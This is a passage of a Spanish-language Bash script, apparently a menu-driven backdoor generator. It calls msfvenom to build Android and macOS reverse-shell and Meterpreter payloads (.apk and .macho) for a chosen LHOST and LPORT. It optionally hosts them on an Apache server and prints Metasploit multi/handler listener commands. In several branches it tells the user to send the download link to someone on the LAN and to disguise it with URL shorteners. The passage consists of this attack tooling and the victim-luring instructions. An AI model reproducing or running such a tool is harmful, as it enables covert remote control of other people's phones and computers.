			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	elif [[ $optiondos == 7 || $optiondos == 07 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mandroid/shell/reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .apk > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .apk al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .apk. Tambien si quieres que el .apk se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .apk al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p android/shell/reverse_tcp LHOST=$lhost LPORT=$lport R > /var/www/html/$nombre.apk
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/shell/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.apk \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .apk del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.apk
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/shell/reverse_tcp LHOST=$lhost LPORT=$lport R > $nombre.apk
			mv $nombre.apk Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/shell/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/shell/reverse_tcp LHOST=$lhost LPORT=$lport R > $ruta/$nombre.apk 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/shell/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 
	fi
fi
if [[ $option == 4 || $option == 04 ]]; then
clear
banner6
echo -e                  "\e[0;36m[\e[0;34m01\e[0;36m] \e[1;36mosx/x64/meterpreter_reverse_http "
echo -e                  "\e[0;36m[\e[0;34m02\e[0;36m] \e[1;36mosx/x64/meterpreter_reverse_https"
echo -e                  "\e[0;36m[\e[0;34m03\e[0;36m] \e[1;36mosx/x64/meterpreter_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m04\e[0;36m] \e[1;36mosx/x64/meterpreter/reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m05\e[0;36m] \e[1;36mosx/x64/shell_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m06\e[0;36m] \e[1;36mosx/x86/shell_reverse_tcp"
echo ""
read -p $"Payload > " optiondos
	if [[ $optiondos == 1 || $optiondos == 01 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mosx/x64/meterpreter_reverse_http"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .macho > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .macho al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .macho. Tambien si quieres que el .macho se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .macho al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p osx/x64/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f macho > /var/www/html/$nombre.macho
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.macho \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.macho
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p osx/x64/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f macho > $nombre.macho 
			mv $nombre.macho Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p osx/x64/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f macho > $ruta/$nombre.macho
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 2 || $optiondos == 02 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mosx/x64/meterpreter_reverse_http"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .macho > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .macho al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .macho. Tambien si quieres que el .macho se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .macho al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p osx/x64/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f macho > /var/www/html/$nombre.macho
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.macho \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.macho
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p osx/x64/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f macho > $nombre.macho 
			mv $nombre.macho Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p osx/x64/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f macho > $ruta/$nombre.macho
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	elif [[ $optiondos == 3 || $optiondos == 03 ]]; then 
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mosx/x64/meterpreter_reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .macho > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .macho al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .macho. Tambien si quieres que el .macho se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .macho al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > /var/www/html/$nombre.macho
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.macho \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.macho
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $nombre.macho 
			mv $nombre.macho Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $ruta/$nombre.macho
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 
 

	elif [[ $optiondos == 4 || $optiondos == 04 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mosx/x64/meterpreter/reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .macho > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .macho al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .macho. Tambien si quieres que el .macho se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .macho al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f macho > /var/www/html/$nombre.macho
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.macho \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.macho
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $nombre.macho 
